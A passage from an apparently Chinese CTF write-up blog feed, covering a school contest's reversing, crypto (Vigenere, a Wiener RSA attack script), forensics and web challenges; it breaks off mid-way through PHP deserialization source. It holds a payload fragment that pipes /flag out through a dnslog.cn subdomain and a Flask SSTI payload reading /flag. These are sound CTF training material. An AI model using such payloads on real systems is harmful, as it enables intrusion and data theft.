</code>cat/flag|base64<code>.069kqq.dnslog.cn&quot;;}</code>，然后登录查询test用户的留言即可反序列化成功，查看dns解析记录即可得到flag。(curl xxx.069kqq.dnslog.cn，那边会记录 xxx.069kqq.dnslog.cn这条访问记录)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cumt2020十月校赛 by 水一水</title>
      <link href="/2020/10/23/cumtctf2020-shi-yue-xiao-sai/"/>
      <url>/2020/10/23/cumtctf2020-shi-yue-xiao-sai/</url>
      
        <content type="html"><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="hello-word"><a href="#hello-word" class="headerlink" title="hello word"></a>hello word</h3><p>拖到IDA中查看，打开sub_40156F函数<br><img src="https://img-blog.csdnimg.cn/20201023180537795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODMxODE4,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>对此代码分析，a1为输入的字符串，查看byte_403020和aIsEasyRight。<br><img src="https://img-blog.csdnimg.cn/20201023180915931.png#pic_center" alt="在这里插入图片描述"><br>写一个python脚本推出a1。<br><img src="https://img-blog.csdnimg.cn/20201023181001159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODMxODE4,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>得到Flag</p><h3 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h3><h4 id="1、拖进IDA分析代码"><a href="#1、拖进IDA分析代码" class="headerlink" title="1、拖进IDA分析代码"></a>1、拖进IDA分析代码</h4><p><img src="https://i.loli.net/2020/10/23/Cw5PTf6o2g9uRI7.png" alt="image-20201023130444214"></p><p>可以看见调用了函数 sub_401530后，就出现了flag的字符串，由此猜测这是个关键函数。</p><h4 id="2、双击进入该函数："><a href="#2、双击进入该函数：" class="headerlink" title="2、双击进入该函数："></a>2、双击进入该函数：</h4><p><img src="https://i.loli.net/2020/10/23/g3pPe45S6HbdzYD.png" alt="image-20201023130904749"></p><p>dword_407044是用于存储用户输入的东西，dword_403010、dword_40703E是已知的数组。</p><p>分别查看各个地址存的东西：</p><p><img src="https://i.loli.net/2020/10/23/IZeDHSJLbEMKgCf.png" alt="image-20201023131427224"></p><p><img src="https://i.loli.net/2020/10/23/WCDwmHkQe3qIvK6.png" alt="image-20201023131404760"></p><h4 id="3、分析循环"><a href="#3、分析循环" class="headerlink" title="3、分析循环"></a>3、分析循环</h4><p>结合循环可知应该是个四元一次方程组，dword_403010中存的是方程系数，dword_40703E中存的是常数项。于是百度找<a href="http://www.99cankao.com/algebra/unknwn4.php" target="_blank" rel="noopener">四元一次方程组计算器</a>，计算可得解</p><p><img src="https://i.loli.net/2020/10/23/tB8T2Oh6s4rPgqp.png" alt="image-20201023131901437"></p><p>再转成16进制套上cumtctf{}提交即可。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h3><h4 id="1、合理猜测是古典密码"><a href="#1、合理猜测是古典密码" class="headerlink" title="1、合理猜测是古典密码"></a>1、合理猜测是古典密码</h4><p>拿到题目文件，打开是一长串字符，结合题目名字猜测是古典密码。而古典密码就三种，尝试过后，猜测是vigenere密码。</p><h4 id="2、用工具进行解密"><a href="#2、用工具进行解密" class="headerlink" title="2、用工具进行解密"></a>2、用工具进行解密</h4><p>由于不知道密钥，所以选择<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">vigenere爆破</a>，得到：</p><p>There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,because you have only one life and one chance to do all the things you want to do.May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others’shoes.If you feel that it hurts you,it probably hurts the other person, too.The happiest of people don’t necessarily have the best of everything;they just make the most of everything that comes along their way.Happiness lies for those who cry,those who hurt, those who have searched,and those who have tried,for only they can appreciate the importance of people.who have touched their lives.Love begins with a smile,grows with a kiss and ends with a tear.The brightest future will always be based on a forgotten past, you can’t go on well in lifeuntil you let go of your past failures and heartaches.And in the end, I am glad to tell you the CUMTCTF is EnjoyTheVigenereCipher.By the way, remember to use braces before submitting.</p><p>这样一段文字，阅读后得到flag为CUMTCTF{EnjoyTheVigenereCipher}。</p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>网上无法对题目给出的n进行分解，百度找到脚本直接分解可得：</p><p><img src="https://i.loli.net/2020/10/23/dobRjkgeZxM8Ua3.png" alt="image-20201023133157594"></p><pre class=" language-python"><code class="language-python"><span class="token triple-quoted-string string">'''Created on Dec 14, 2011@author: pablocelayes'''</span><span class="token keyword">import</span> ContinuedFractions<span class="token punctuation">,</span> Arithmetic<span class="token punctuation">,</span> RSAvulnerableKeyGenerator<span class="token keyword">import</span> binascii<span class="token keyword">import</span> codecs<span class="token keyword">def</span> <span class="token function">hack_RSA</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    Finds d knowing (e,n)    applying the Wiener continued fraction attack    '''</span>    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span>d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#check if d is actually the key</span>        <span class="token keyword">if</span> k<span class="token operator">!=</span><span class="token number">0</span> <span class="token operator">and</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">%</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">//</span>k            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>            <span class="token comment" spellcheck="true"># check if the equation x^2 - s*x + n = 0</span>            <span class="token comment" spellcheck="true"># has integer roots</span>            discr <span class="token operator">=</span> s<span class="token operator">*</span>s <span class="token operator">-</span> <span class="token number">4</span><span class="token operator">*</span>n            <span class="token keyword">if</span><span class="token punctuation">(</span>discr<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span class="token punctuation">)</span>                <span class="token keyword">if</span> t<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>s<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># print("Hacked!")</span>                    <span class="token keyword">return</span> d<span class="token comment" spellcheck="true"># TEST functions</span><span class="token keyword">def</span> <span class="token function">test_hack_RSA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># print("Testing Wiener Attack")</span>    times <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>times<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        e<span class="token punctuation">,</span>n<span class="token punctuation">,</span>d <span class="token operator">=</span> RSAvulnerableKeyGenerator<span class="token punctuation">.</span>generateKeys<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print("(e,n) is (", e, ", ", n, ")")</span>        <span class="token comment" spellcheck="true"># print("d = ", d)</span>        hacked_d <span class="token operator">=</span> hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> hacked_d<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print("Hack WORKED!")</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print("Hack FAILED")</span>            <span class="token keyword">pass</span>        <span class="token comment" spellcheck="true"># print("d = ", d, ", hacked_d = ", hacked_d)</span>        <span class="token comment" spellcheck="true"># print("-------------------------")</span>        times <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span>    e <span class="token operator">=</span> <span class="token number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span>    c <span class="token operator">=</span> <span class="token number">235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span>    <span class="token comment" spellcheck="true">#test_is_perfect_square()</span>    d <span class="token operator">=</span> <span class="token number">8264667972294275017293339772371783322168822149471976834221082393409363691895</span>    m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">num2str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> hex<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span> <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'hex'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token operator">+</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print("-------------------------")</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>num2str<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>依次运行得到d，然后稍微改下代码运行得到flag。</p><p><img src="https://i.loli.net/2020/10/23/ukG48wc92xqzOlN.png" alt="image-20201023161558174"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h3><h4 id="拿到文件后"><a href="#拿到文件后" class="headerlink" title="拿到文件后"></a>拿到文件后</h4><p><img src="https://i.loli.net/2020/10/23/FJ3vQEOW9iHIXqu.png" alt="image-20201023133655163"></p><p>看到这个文件最近修改过，依次跟入</p><p><img src="https://i.loli.net/2020/10/23/awRMeSz2cfNF9lX.png" alt="image-20201023160315989"></p><p><img src="https://i.loli.net/2020/10/23/2EX8ehFzRK3Zi1x.png" alt="image-20201023160535098"></p><p>发现flag。</p><h3 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h3><p>打开文档发现一个空白文字，猜测应该有隐藏的文本，显示隐藏编辑标记找到flag。</p><p><img src="https://i.loli.net/2020/10/23/t3MlciQK2HYzSsv.png" alt="image-20201023160836103"></p><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><p>打开文件</p><p>base64解码，得到brainfuck编码<a href="https://tool.bugku.com/brainfuck/?wafcloud=1%E8%A7%A3%E7%A0%81%E5%8D%B3%E5%8F%AF" target="_blank" rel="noopener">https://tool.bugku.com/brainfuck/?wafcloud=1解码即可</a></p><h3 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h3><p>wires hark打开后，发现http请求很多</p><p>导出http对象，发现flag文件</p><p><img src="../../../../medias/img/image-20201023215408729.png" alt="image-20201023215408729"></p><p>导出后base64解码即可</p><h3 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h3><p>用Stegsolve打开，将所有lsb有效位调为0，发现png图片，导出为二维码，扫描即可</p><p><img src="../../../../medias/img/image-20201023220005029.png" alt="image-20201023220005029"></p><h3 id="出个内存取证吧"><a href="#出个内存取证吧" class="headerlink" title="出个内存取证吧"></a>出个内存取证吧</h3><p>volatility imageinfo -f memory.img</p><p><img src="../../../../medias/img/image-20201023220525993.png" alt="image-20201023220525993"></p><p>测试后第二个可以 Win2003SP1x86</p><blockquote><p>volatility -f memory.img –profile=Win2003SP1x86 filescan | grep flag</p></blockquote><p><img src="../../../../medias/img/image-20201023221121725.png" alt="image-20201023221121725"></p><p>导出文件</p><blockquote><p>volatility -f memory.img –profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 -D ./</p></blockquote><p>得到二维码扫描</p><blockquote><p>jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p></blockquote><p>查看窗口</p><blockquote><p>volatility -f memory.img –profile=Win2003SP1x86 windows</p></blockquote><p><img src="../../../../medias/img/image-20201023221742203.png" alt="image-20201023221742203"></p><p>flag.png 是由 explorer.exe 进程里的 Windows 图片查看器打开的</p><p>dumpexplorer.exe 进程</p><blockquote><p>volatility -f memory.img –profile=Win2003SP1x86 memdump -p 1992 -D ./</p></blockquote><p>对导出的文件foremost分离</p><p>得到图片</p><p><img src="../../../../medias/img/image-20201023221924851.png" alt="image-20201023221924851"></p><p>所以之前得到的是aes 加密</p><blockquote><p>密文：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p><p>key: Th1s_1s_K3y00000</p><p>iv: 1234567890123456</p><p>在线解密<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptaes</a></p></blockquote><h3 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h3><p>打开有个txt，内容是flag is not here</p><p>放到hxd</p><p><img src="../../../../medias/img/image-20201023222334922.png" alt="image-20201023222334922"></p><p>发现隐藏文件</p><p><img src="../../../../medias/img/image-20201023222542579.png" alt="image-20201023222542579"></p><p>将7A改为74即可分离出图片</p><p><img src="../../../../medias/img/image-20201023222627561.png" alt="image-20201023222627561"></p><p>将图片后缀改为gif，ps打开，分离出另一个图层，放进Stegsolve，看到另一半二维码</p><p>ps拼凑一起扫描即可</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p><img src="../../../../medias/img/image-20201023212812778.png" alt="image-20201023212812778"></p><p>ssti，过滤了中括号，用<code>__getitem__</code>绕过</p><p>payload</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//202.119.201.199:9001/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()%7D%7D</span></code></pre><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>打开网页，查看源代码，发现一大堆颜表情，用aaencode解码，发现还有加密，再用Unicode解码，最终得到源代码</p><pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">var</span> isBegin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">numRand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">9999</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> y <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> rand <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rand<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">isPrimeNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token regex">/^.?$|^(..+?)\1+$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token function">Array</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPrimeNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span> <span class="token string">'check.php'</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span> <span class="token string">'num='</span> <span class="token operator">+</span> num<span class="token punctuation">,</span>            success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span> <span class="token string">'It seems t'</span>        <span class="token operator">+</span><span class="token string">'hat you are'</span>        <span class="token operator">+</span><span class="token string">' not lucky '</span>        <span class="token operator">+</span><span class="token string">'enough, ple'</span>        <span class="token operator">+</span><span class="token string">'ase keep tr'</span>        <span class="token operator">+</span><span class="token string">'ying.'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> u <span class="token operator">=</span> <span class="token number">265</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>isBegin<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        isBegin <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-position'</span><span class="token punctuation">,</span> <span class="token string">'11px 0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">numRand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> num_arr <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> _num <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> yPos <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>u <span class="token operator">*</span> num_arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                _num<span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    backgroundPosition<span class="token punctuation">:</span> <span class="token string">'11px '</span> <span class="token operator">+</span> yPos <span class="token operator">+</span> <span class="token string">'px'</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                    duration<span class="token punctuation">:</span> <span class="token number">6000</span> <span class="token operator">+</span> index <span class="token operator">*</span> <span class="token number">3000</span><span class="token punctuation">,</span>                    easing<span class="token punctuation">:</span> <span class="token string">"easeInOutCirc"</span><span class="token punctuation">,</span>                    complete<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            isBegin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                            <span class="token function">check</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现每次摇都是向check.php发个数字，看到isPrimeNum（）函数要求num是质数，burpsuite抓包然后发一个num质数就得到flag</p><h3 id="hodor"><a href="#hodor" class="headerlink" title="hodor"></a>hodor</h3><p><img src="../../../../medias/img/image-20201023213026199.png" alt="image-20201023213026199"></p><p>得到源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">Class</span> <span class="token class-name">Source</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'license.txt'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">easy_check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//echo $str;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'todos'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">easy_check</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'todos'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Hacker!\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'todos'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$h</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$h</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//这里只需将反序列化的字符串32位md5加密，再加上原字符串即可</span>            <span class="token variable">$todos</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$todo</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'text'</span><span class="token 